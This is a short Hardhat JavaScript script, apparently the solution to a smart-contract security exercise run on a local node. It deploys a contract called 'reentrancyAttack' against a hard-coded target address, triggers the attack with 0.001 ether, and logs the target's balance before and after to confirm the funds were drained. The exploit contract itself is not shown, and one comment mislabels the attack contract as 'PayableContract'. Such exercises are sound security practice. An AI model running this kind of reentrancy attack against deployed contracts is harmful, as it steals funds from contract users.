const { ethers } = require("hardhat");

const CONTRACT_ADDRESS = "0x524F04724632eED237cbA3c37272e018b3A7967e";
const PLAYER_ADDRESS = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";
// Create a JsonRpcProvider instance that connects to the local network
const provider = new ethers.providers.JsonRpcProvider("http://localhost:8545");

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);
  // Deploy the PayableContract
  const reentrancyAttackFactory = await ethers.getContractFactory(
    "reentrancyAttack",
    signer
  );
  const reentrancyAttack = await reentrancyAttackFactory.deploy(
    CONTRACT_ADDRESS
  );
  await reentrancyAttack.deployed();
  console.log("PayableContract deployed to:", reentrancyAttack.address);

  const balanceBeforeAttack = await provider.getBalance(CONTRACT_ADDRESS);
  console.log(
    "balanceBeforeAttack",
    ethers.utils.formatEther(balanceBeforeAttack)
  );
  await reentrancyAttack.attack({
    value: ethers.utils.parseEther("0.001"),
  });
  const balanceAfterAttack = await provider.getBalance(CONTRACT_ADDRESS);
  console.log(
    "balanceAfterAttack",
    ethers.utils.formatEther(balanceAfterAttack)
  );
}
main().catch((error) => {
  console.error(error);
  process.exit(1);
});
